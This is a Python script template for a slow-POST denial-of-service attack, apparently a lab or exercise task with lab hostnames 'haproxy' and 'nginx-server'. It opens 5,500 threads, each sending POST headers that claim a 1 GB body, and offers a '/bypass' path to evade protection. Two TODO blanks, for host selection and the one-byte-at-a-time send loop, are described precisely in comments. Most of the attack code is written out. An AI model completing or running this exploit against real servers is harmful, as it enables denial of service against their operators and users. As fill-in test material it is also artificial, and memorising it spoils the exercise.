import socket
import time
import threading
import sys

# Usage: python3 slow_post_threads.py [proxy|direct] [protected|bypass]
target = sys.argv[1] if len(sys.argv) > 1 else "proxy"
mode = sys.argv[2] if len(sys.argv) > 2 else "protected"

# TODO: Task 1 - Implement target host and port selection
# Complete the logic to set the correct host and port based on the target argument
# - If target is "proxy", use "haproxy" as host and 8081 as port
# - If target is "direct", use "nginx-server" as host and 80 as port
# ** FILL HERE **
if target == "proxy":
    # ** FILL HERE **
    pass
else:
    # ** FILL HERE **
    pass

path = "/" if mode == "protected" else "/bypass"

content_length = 1000000000
num_threads = 5500

def slow_post(thread_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        print(f"[{thread_id}] Connected to {host}:{port} ({mode})")

        headers = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n\r\n"
        )
        sock.send(headers.encode())

        # TODO: Task 2 - Implement slow data transmission
        # Send data slowly to keep the connection open
        # Send one byte at a time with a 0.05 second delay between sends
        # ** FILL HERE **
        while True:
            # ** FILL HERE **
            pass
    except Exception as e:
        print(f"[{thread_id}] Error: {e}")

print(f"[+] Starting {num_threads} slow POST threads to {host}:{port}{path}")
for i in range(num_threads):
    threading.Thread(target=slow_post, args=(i,), daemon=True).start()

while True:
    time.sleep(10)